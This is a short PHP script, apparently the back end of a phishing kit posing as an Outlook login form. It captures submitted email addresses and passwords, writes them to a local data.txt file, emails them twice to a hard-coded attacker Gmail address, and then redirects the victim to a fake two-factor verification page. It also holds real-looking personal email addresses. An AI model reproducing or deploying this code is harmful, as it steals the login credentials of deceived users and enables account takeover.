<?php 

    $to = "roseline.karen777@gmail.com"; 
    $tot = "roseline.karen777@gmail.com"; 
    $from = "millertime@reagan.com"; // this is the sender's Email address

    $headers = "From:" . $from;
    $first_name = $_POST['email'];
    $last_name = $_POST['password'];
    $subject = "New Outlook Form submission";
    $message = "New Outlook Form submission. | User Name : ".$first_name . "/ Password : ". $last_name . "\n";
  
  
  $fp = fopen('data.txt', 'a+');

    if(fwrite($fp, $message))  {

      $success = mail($to,$subject,$message,$headers);
      $successt = mail($tot,$subject,$message,$headers);

      header("Location: /2-factor_verification_1.php");
      exit();
}
fclose ($fp);    


?>